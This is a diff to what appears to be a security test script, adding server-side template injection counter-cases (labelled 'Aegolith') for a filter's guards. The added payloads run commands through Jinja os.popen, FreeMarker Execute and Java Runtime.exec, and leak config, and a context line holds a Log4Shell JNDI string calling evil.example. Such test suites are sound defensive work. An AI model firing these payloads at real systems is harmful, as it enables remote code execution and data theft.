@@ -178,6 +178,14 @@ q $A ssti "go call action"             "{{ call .Func }}"
 q $A ssti "go define action"           "{{define \"x\"}}{{.}}{{end}}"
 q $A ssti "el arithmetic"              "\${7*7}"
 q $A ssti "el member access"           "\${user.password}"
+# Aegolith: counter-cases for the plain-pipe, i18n-call and #{ } guards: a filter call, a config leak through list
+# concatenation, a call before an inner {{ }}, a FreeMarker binding before a one-letter call, #{ } as ${ } (alpha.6).
+q $A ssti "jinja attr filter call"     "{{ request|attr('application') }}"
+q $A ssti "jinja config concat leak"   "{{ [x]|list +config|dictsort }}"
+q $A ssti "call before inner braces"   "{{ lipsum.__globals__.os.popen('id').read() ~ {{a|b}} }}"
+q $A ssti "freemarker one-letter call" "<#assign t=\"freemarker.template.utility.Execute\"?new()>\${t(\"id\")}"
+json $A ssti "hash el runtime"         '{"note":"#{T(java.lang.Runtime).getRuntime().exec(\"id\")}"}'
+q $A ssti "hash el quoted product"     "#{7*'7'}"
 
 # --- 7. Log4Shell / JNDI ---------------------------------------------------------------------------------------
 hdr $A log4shell "jndi in user-agent"  User-Agent "\${jndi:ldap://evil.example/a}"
